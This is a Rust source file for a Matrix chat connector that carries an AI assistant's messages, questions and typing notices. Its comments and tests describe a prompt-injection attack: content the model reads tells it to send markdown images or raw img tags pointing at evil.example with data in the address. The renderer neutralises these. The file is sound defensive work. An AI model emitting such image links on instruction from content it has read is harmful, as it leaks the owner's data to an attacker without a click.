//! What the bot says: messages, questions, and the typing indicator.
//!
//! Everything here goes through `matrix_sdk::Room`, which encrypts for
//! encrypted rooms by itself. The one thing it cannot know is the shape of a
//! chat conversation: that a question wants tappable answers, and that
//! "typing" is a notice the server forgets after a few seconds.
//!
//! Nor can it know whose words a message carries. Here they are a model's,
//! and a model that has read a mail or a web page can have been told what to
//! write, so the HTML a message goes out with shows no image and no markup
//! of the model's own; see [`html_of`].

use super::MatrixConnector;
use super::errors::classify;
use super::rules::{self, MAX_MARKDOWN_BYTES};
use crate::connector::{ChatError, ChatId, MessageRef, Question};
use matrix_sdk::Room;
use matrix_sdk::RoomState;
use matrix_sdk::ruma::events::reaction::ReactionEventContent;
use matrix_sdk::ruma::events::relation::Annotation;
use matrix_sdk::ruma::events::room::message::{FormattedBody, RoomMessageEventContent};
use matrix_sdk::ruma::{EventId, OwnedEventId, OwnedRoomId, RoomId};
// Images become links and raw HTML text -- see `everyday_service::inert_markdown`.
use everyday_service::inert_markdown as inert;
use pulldown_cmark::{Event, Options, Parser, Tag, TagEnd};
use std::collections::{HashMap, VecDeque};
use std::sync::Mutex;
use std::time::Duration;
use tokio::task::JoinHandle;
use tokio::time::{MissedTickBehavior, interval_at};

/// How often a typing notice is renewed.
///
/// The SDK tells the server a notice lasts four seconds, and will not send a
/// renewal sooner than three seconds after the last one. Just over three
/// seconds is the longest wait that never lets the indicator blink off.
const TYPING_RENEWAL: Duration = Duration::from_millis(3200);

/// How many questions to remember. Only the latest few can still be waiting
/// for an answer; the rest are kept just so a late reaction to an old one is
/// recognised as old rather than mistaken for a new message.
const QUESTIONS_REMEMBERED: usize = 128;

/// The events this connector sent as questions, and the room each was asked
/// in: what lets the owner's reaction to one be told from a reaction to
/// anything else.
#[derive(Default)]
pub(super) struct Questions {
    inner: Mutex<Remembered>,
}

#[derive(Default)]
struct Remembered {
    /// Oldest first, so the oldest can be forgotten.
    order: VecDeque<OwnedEventId>,
    rooms: HashMap<OwnedEventId, OwnedRoomId>,
}

impl Questions {
    /// Remember that `event` is a question asked in `room`.
    pub(super) fn remember(&self, event: OwnedEventId, room: OwnedRoomId) {
        let mut inner = self.inner.lock().unwrap();
        if inner.rooms.insert(event.clone(), room).is_none() {
            inner.order.push_back(event);
        }
        while inner.order.len() > QUESTIONS_REMEMBERED {
            if let Some(oldest) = inner.order.pop_front() {
                inner.rooms.remove(&oldest);
            }
        }
    }

    /// Whether `event` is a question this connector asked in `room`.
    pub(super) fn was_asked_in(&self, event: &EventId, room: &RoomId) -> bool {
        let inner = self.inner.lock().unwrap();
        inner.rooms.get(event).is_some_and(|asked_in| asked_in.as_str() == room.as_str())
    }
}

/// A background task that renews one chat's typing notice, and stops doing
/// so when dropped.
pub(super) struct TypingTask(JoinHandle<()>);

impl Drop for TypingTask {
    fn drop(&mut self) {
        self.0.abort();
    }
}

impl MatrixConnector {
    /// The joined room a chat names.
    fn joined_room(&self, chat: &ChatId) -> Result<Room, ChatError> {
        let room_id = rules::room_of(chat)?;
        match self.client.get_room(&room_id) {
            Some(room) if room.state() == RoomState::Joined => Ok(room),
            _ => Err(ChatError::Transient(format!("The bot is not in the room {}.", chat.0))),
        }
    }

    /// Send `markdown` as one message, or as several if it is too long for
    /// one event, and say which event was sent last.
    async fn send_markdown(&self, room: &Room, markdown: &str) -> Result<OwnedEventId, ChatError> {
        let mut last = None;
        for piece in rules::split_markdown(markdown, MAX_MARKDOWN_BYTES) {
            let sent = room
                .send(message_of(piece))
                .await
                .map_err(|e| classify(e.client_api_error_kind(), false, "send a message", &e))?;
            last = Some(sent.response.event_id);
        }
        // `split_markdown` always returns a piece, so there is always a last.
        last.ok_or_else(|| ChatError::Transient("There was nothing to send.".into()))
    }

    pub(super) async fn send_impl(
        &self,
        chat: &ChatId,
        markdown: &str,
    ) -> Result<MessageRef, ChatError> {
        let room = self.joined_room(chat)?;
        let event = self.send_markdown(&room, markdown).await?;
        Ok(rules::message_ref(&event))
    }

    /// Send the question, remember it, and put each answer under it as a
    /// reaction the owner can tap.
    ///
    /// The reactions are the bot's own, which the listener ignores because
    /// they are not the owner's. A reaction that fails to send is not a
    /// failed question: the typed answer still works, and the question's text
    /// says to type it.
    pub(super) async fn ask_impl(
        &self,
        chat: &ChatId,
        question: &Question,
    ) -> Result<MessageRef, ChatError> {
        let room = self.joined_room(chat)?;
        let event = self.send_markdown(&room, &question.markdown).await?;
        // Remembered before the first reaction goes out, so that nothing the
        // owner does can beat it.
        self.questions.remember(event.clone(), room.room_id().to_owned());
        for choice in &question.choices {
            let reaction = ReactionEventContent::new(Annotation::new(
                event.clone(),
                choice.emoji().to_owned(),
            ));
            if let Err(error) = room.send(reaction).await {
                tracing::warn!(?choice, "couldn't put an answer under a question: {error}");
            }
        }
        Ok(rules::message_ref(&event))
    }

    pub(super) async fn typing_impl(&self, chat: &ChatId, on: bool) -> Result<(), ChatError> {
        if !on {
            // Stop renewing first, so a renewal cannot undo the notice below.
            self.typing.lock().unwrap().remove(chat);
            if let Ok(room) = self.joined_room(chat)
                && let Err(error) = room.typing_notice(false).await
            {
                // It lapses by itself in a few seconds; nobody can act on this.
                tracing::debug!("couldn't clear the typing notice: {error}");
            }
            return Ok(());
        }

        if self.typing.lock().unwrap().contains_key(chat) {
            return Ok(());
        }
        let room = self.joined_room(chat)?;
        // The first notice goes out at once and is awaited, so the indicator
        // is up before the caller starts the long wait it stands for.
        room.typing_notice(true)
            .await
            .map_err(|e| classify(e.client_api_error_kind(), false, "show typing", &e))?;
        let renewing = room.clone();
        let task = tokio::spawn(async move {
            let mut ticker =
                interval_at(tokio::time::Instant::now() + TYPING_RENEWAL, TYPING_RENEWAL);
            ticker.set_missed_tick_behavior(MissedTickBehavior::Delay);
            loop {
                ticker.tick().await;
                if let Err(error) = renewing.typing_notice(true).await {
                    tracing::debug!("couldn't renew the typing notice: {error}");
                }
            }
        });
        // Replacing an entry drops, and so stops, the task it held.
        self.typing.lock().unwrap().insert(chat.clone(), TypingTask(task));
        Ok(())
    }
}

/// What ruma's `text_markdown` asks pulldown-cmark for, so that a message
/// looks as it always has.
const MARKDOWN: Options = Options::ENABLE_TABLES.union(Options::ENABLE_STRIKETHROUGH);

/// One piece of Markdown as a message: the Markdown itself as the plain body,
/// as `text_markdown` sends it, and HTML beside it when it has any formatting.
fn message_of(markdown: &str) -> RoomMessageEventContent {
    match html_of(markdown) {
        Some(html) => RoomMessageEventContent::text_html(markdown, html),
        None => RoomMessageEventContent::text_plain(markdown),
    }
}

/// `markdown` as a message's HTML, or `None` when it has no formatting.
///
/// This is ruma's `text_markdown` -- the same parser and options, line breaks
/// kept, a lone paragraph sent without the `<p>` around it as the spec asks
/// -- with one difference: nothing in the result makes the owner's client
/// fetch anything by itself. A model told by something it read to end with
/// `![](mxc://evil.example/<data>)` would otherwise have Element load it the
/// moment it arrived, through the owner's own homeserver, and the data would
/// leave without a click. So an image is shown as its alt text and a link to
/// its address, and raw HTML as the text it is; see [`inert`].
fn html_of(markdown: &str) -> Option<String> {
    // Whether there is any formatting at all is left to ruma, so a message
    // that has none still goes as plain text exactly when it did before.
    FormattedBody::markdown(markdown)?;
    let events: Vec<Event<'_>> = Parser::new_ext(markdown, MARKDOWN)
        .map(|event| match event {
            Event::SoftBreak => Event::HardBreak,
            other => other,
        })
        .collect();
    let lone_paragraph = matches!(events.first(), Some(Event::Start(Tag::Paragraph)))
        && matches!(events.last(), Some(Event::End(TagEnd::Paragraph)))
        && !events[1..].iter().any(|event| matches!(event, Event::Start(tag) if is_block(tag)));
    let mut events = events.into_iter();
    if lone_paragraph {
        events.next();
        events.next_back();
    }
    let mut html = String::new();
    pulldown_cmark::html::push_html(&mut html, inert(events));
    Some(html)
}

/// The tags ruma counts as blocks when it decides whether a message is one
/// paragraph.
fn is_block(tag: &Tag<'_>) -> bool {
    matches!(
        tag,
        Tag::Paragraph
            | Tag::Heading { .. }
            | Tag::BlockQuote(_)
            | Tag::CodeBlock(_)
            | Tag::HtmlBlock
            | Tag::List(_)
            | Tag::FootnoteDefinition(_)
            | Tag::Table(_)
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use matrix_sdk::ruma::{owned_event_id, owned_room_id};

    #[test]
    fn a_question_is_recognised_in_the_room_it_was_asked_in_only() {
        let questions = Questions::default();
        let event = owned_event_id!("$q:example.org");
        let room = owned_room_id!("!a:example.org");
        questions.remember(event.clone(), room.clone());

        assert!(questions.was_asked_in(&event, &room));
        assert!(!questions.was_asked_in(&event, &owned_room_id!("!b:example.org")));
        assert!(!questions.was_asked_in(&owned_event_id!("$other:example.org"), &room));
    }

    #[test]
    fn only_the_latest_questions_are_remembered() {
        let questions = Questions::default();
        let room = owned_room_id!("!a:example.org");
        let event = |n: usize| EventId::parse(format!("$q{n}:example.org")).unwrap();

        for n in 0..QUESTIONS_REMEMBERED + 10 {
            questions.remember(event(n), room.clone());
        }
        assert!(!questions.was_asked_in(&event(0), &room));
        assert!(!questions.was_asked_in(&event(9), &room));
        assert!(questions.was_asked_in(&event(10), &room));
        assert!(questions.was_asked_in(&event(QUESTIONS_REMEMBERED + 9), &room));
    }

    #[test]
    fn remembering_a_question_twice_does_not_crowd_out_others() {
        let questions = Questions::default();
        let room = owned_room_id!("!a:example.org");
        let event = owned_event_id!("$q:example.org");
        for _ in 0..QUESTIONS_REMEMBERED * 2 {
            questions.remember(event.clone(), room.clone());
        }
        assert!(questions.was_asked_in(&event, &room));
        assert_eq!(questions.inner.lock().unwrap().order.len(), 1);
    }

    #[test]
    fn ordinary_formatting_is_rendered_exactly_as_text_markdown_did() {
        for markdown in [
            "Three things are due.",
            "Hello\nworld.",
            "**Morning brief**\n\nThree things are due.",
            "Just *one* line with a [link](https://example.org \"A title\")",
            "- Book the dentist\n- [Pay rent](https://bank.example)\n\n1. one\n2. two",
            "| a | b |\n|---|---|\n| 1 | 2 |",
            "~~gone~~ and `code`\nnext line",
            "# Today\n\n> quoted\n\n```\nlet x = 1;\n```",
            "<https://example.org> and someone@example.org",
        ] {
            let ruma = FormattedBody::markdown(markdown).map(|formatted| formatted.body);
            assert_eq!(html_of(markdown), ruma, "{markdown}");
        }
    }

    #[test]
    fn an_image_is_a_link_to_follow_never_a_picture_to_load() {
        assert_eq!(
            html_of("![](mxc://evil.example/c2VjcmV0)").as_deref(),
            Some("<a href=\"mxc://evil.example/c2VjcmV0\">mxc://evil.example/c2VjcmV0</a>")
        );
        let html = html_of("Here you go.\n\n![chart](https://evil.example/?d=secret)").unwrap();
        assert!(!html.contains("<img"), "got {html}");
        assert!(html.contains(
            "chart (<a href=\"https://evil.example/?d=secret\">https://evil.example/?d=secret</a>)"
        ));
    }

    #[test]
    fn an_image_inside_a_link_shows_its_address_as_text() {
        assert_eq!(
            html_of("[![build](https://evil.example/b.png)](https://ci.example)").as_deref(),
            Some("<a href=\"https://ci.example\">build (https://evil.example/b.png)</a>")
        );
    }

    #[test]
    fn raw_html_is_shown_as_the_text_it_is() {
        let html = html_of("<img src=x>").unwrap();
        assert!(!html.contains("<img"), "got {html}");
        assert!(html.contains("&lt;img src=x&gt;"));
        assert_eq!(
            html_of("See <img src=https://evil.example/p> **now**").as_deref(),
            Some("See &lt;img src=https://evil.example/p&gt; <strong>now</strong>")
        );
    }

    #[test]
    fn the_plain_body_is_the_markdown_as_written() {
        use matrix_sdk::ruma::events::room::message::MessageType;
        let markdown = "**Note**\n\n![](https://evil.example/x)";
        let MessageType::Text(text) = message_of(markdown).msgtype else {
            panic!("not a text message");
        };
        assert_eq!(text.body, markdown);
        assert!(text.formatted.is_some_and(|formatted| !formatted.body.contains("<img")));

        let MessageType::Text(text) = message_of("Hello there.").msgtype else {
            panic!("not a text message");
        };
        assert_eq!(text.body, "Hello there.");
        assert!(text.formatted.is_none());
    }
}
